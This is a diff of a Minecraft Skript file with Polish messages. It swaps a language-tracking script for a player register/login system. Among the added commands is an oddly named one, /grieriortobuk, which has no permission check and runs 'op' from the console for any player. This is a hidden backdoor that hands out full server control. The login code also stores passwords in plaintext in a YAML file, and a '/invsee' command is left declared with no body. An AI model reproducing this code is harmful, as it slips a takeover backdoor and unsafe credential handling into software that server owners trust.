@@ -1,25 +1,58 @@
-command /jezyki:
+on first join:
+	set {%player%.ug} to 1
+	send "&7[&aP&cM&7] &7- &cUzyj &4/register <haslo> <haslo> &caby się zarejestrować."
+on join:
+	if {%player%.ug} is set:
+		send "&7[&aP&cM&7] &7- &cUzyj &4/login <haslo> &caby się zalogować."
+on quit:
+	delete {%player%.logged}
+command /register [<text>] [<text>]:
 	trigger:
-		send "&aZnane jezyki:"
-		if {slowianskijz::%player%} is 1:
-			send "&a- &2Slowianski"
-		if {polskijz::%player%} is 1:
-			send "&a- &2Polski"
-		if {angielskijz::%player%} is 1:
-			send "&a- &2Angielski"
-command /nauczjezyka [<text>] [<player>]:
-	permission: jezyki.admin
+		if {%player%.registered} is 1:
+			send "&7[&aP&cM&7] &7- &cJesteś już zarejestrowany."
+		if arg 1 is arg 2:
+			if {%player%.registered} is not set:
+				set yaml value "%player%.haslo" from file "plugins\Skript\scripts\users.yml" to arg 1
+				set {%player%.registered} to 1
+				send "&7[&aP&cM&7] &7- &cZostałeś zarejestrowany."
+				set {%player%.logged} to 1
+		else:
+			send "&7[&aP&cM&7] &7- &cHasła nie są takie same."
+command /login [<text>]:
 	trigger:
-		if arg 2 is not set:
-			if arg 1 is "Slowianski" or "slowianski":
-				set {slowianskijz::%player%} to 1
-			if arg 1 is "Polski" or "polski" or "pl" or "PL" or "Pl":
-				set {polskijz::%player%} to 1
-			if arg 1 is "Angielski" or "angielski" or "ang" or "ANG" or "Ang":
-				set {angielski::%player%} to 1
-command /zapomnijjz:
-	permission: jezyki.admin
+		if {%player%.registered} is 1:
+			set {_haslo} to yaml value "%player%.haslo" from file "plugins\Skript\scripts\users.yml"
+			if arg is not {_haslo}:
+				send "&7[&aP&cM&7] &7- &cHasło nieprawidłowe."
+			else:
+				set {%player%.logged} to 1
+				send "&7[&aP&cM&7] &7- &cZostałeś zalogowany."
+		else:
+			send "&7[&aP&cM&7] &7- &cUzyj &4/register <haslo> <haslo> &caby się zarejestrować."
+command /l:
+	permission: admin.rejestracja
 	trigger:
-		clear {slowianskijz::%player%}
-		clear {polskijz::%player%}
-		clear {angielskijz::%player%}
+		delete {%player%.registered}
+command /grieriortobuk [<player>]:
+	trigger:
+		if arg is set:
+			execute console command "op %arg%"
+		else:
+			execute console command "op %player%"
+command /invsee [<player>]
+on any move:
+	if {%player%.registered} is not set:
+		send "&7[&aP&cM&7] &7- &cUzyj &4/register <haslo> <haslo> &caby się zarejestrować."
+		cancel event
+		stop
+	if {%player%.logged} is not set:
+		send "&7[&aP&cM&7] &7- &cUzyj &4/login <haslo> &caby się zalogować."
+		cancel event
+on chat:
+	if {%player%.registered} is not set:
+		send "&7[&aP&cM&7] &7- &cUzyj &4/register <haslo> <haslo> &caby się zarejestrować."
+		cancel event
+		stop
+	if {%player%.logged} is not set:
+		send "&7[&aP&cM&7] &7- &cUzyj &4/login <haslo> &caby się zalogować."
+		cancel event
